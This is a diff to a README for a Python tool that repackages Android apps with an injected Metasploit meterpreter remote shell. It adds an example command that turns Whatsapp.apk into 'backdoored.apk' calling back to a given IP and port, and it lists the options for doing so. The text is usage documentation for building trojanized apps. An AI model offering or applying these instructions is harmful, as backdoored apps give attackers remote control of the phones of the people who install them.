@@ -1,3 +1,16 @@
+Python Readme:
+
+Example call:
+python2.7 repackager.py -o ./OriginalApk/Whatsapp.apk -out backdoored.apk --meterpreter_ip="192.168.56.1" --meterpreter_port="8432"
+
+Options:
+    -o (original file)
+    -out (output file)
+    --meterpreter_ip (ip of meterpreter)
+    --meterpreter_port (port of meterpreter)
+
+Legacy Readme (to be removed in the future):
+
 This is an script which can automatically generate a remote shell with Metasploit and inject it into another given application.
 
 Requirements:
